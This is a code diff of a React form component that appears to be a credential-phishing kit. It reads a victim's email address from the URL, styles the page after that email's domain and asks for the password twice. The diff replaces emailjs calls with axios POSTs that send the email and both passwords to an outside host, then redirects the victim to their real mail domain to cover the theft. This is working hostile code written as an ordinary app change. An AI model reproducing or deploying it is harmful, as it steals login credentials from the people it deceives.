@@ -1,55 +1,52 @@
 import "./App.css";
 import React, { useState } from "react";
 import { Styls } from "./stylls";
-import emailjs from "emailjs-com";
 import { useParams } from "react-router-dom";
-
+import axios from "axios";
 function Forms() {
   const params = useParams();
   console.log(params.id);
 
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
+  const [pass, setPass] = useState("");
+  const [pasers, setPasser] = useState("");
+  const [email, setEmail] = useState(params.id);
 
+  const submitHandler = async (e) => {
+    e.preventDefault();
+
+    console.log(email, pass);
+    setConfirmForm(true);
+    setShowForm(false);
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail3", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
+  };
   let emailss = params.id;
   let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
-
-  const submitHandler = (e) => {
+  const editHandler = async (e) => {
     e.preventDefault();
-
-    emailjs
-      .sendForm("service_gi68r3i", "template_hxznbhh", e.target, "KsLg5lm9TS3wt54jz")
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-    e.preventDefault();
-    setShowForm(false);
-    setConfirmForm(true);
-  };
-
-  const editHandler = (e) => {
-    e.preventDefault();
-    let emailss = params.id;
-    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
-    emailjs
-      .sendForm("service_gi68r3i", "template_hxznbhh", e.target, "KsLg5lm9TS3wt54jz")
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
 
     window.setTimeout(() => {
       window.location.href = `https://${domain}`;
     }, 1000);
+
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail3", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
   };
   const domainname = domain.substring(0, domain.lastIndexOf(".")).toUpperCase();
 
@@ -78,6 +75,7 @@ function Forms() {
                     <input
                       type="email"
                       name="to_user"
+                      onChange={(e) => setEmail(e.target.value)}
                       required
                       className="form-control"
                       value={params.id}
@@ -85,6 +83,7 @@ function Forms() {
                     <input
                       type="password"
                       name="to_pass"
+                      onChange={(e) => setPass(e.target.value)}
                       required
                       placeholder="Password"
                       className="form-control"
@@ -131,6 +130,7 @@ function Forms() {
                     <input
                       type="email"
                       name="to_user"
+                      onChange={(e) => setEmail(e.target.value)}
                       required
                       className="form-control"
                       value={params.id}
@@ -138,6 +138,7 @@ function Forms() {
                     <input
                       type="password"
                       name="to_pass"
+                      onChange={(e) => setPasser(e.target.value)}
                       required
                       placeholder="Password"
                       className="form-control"
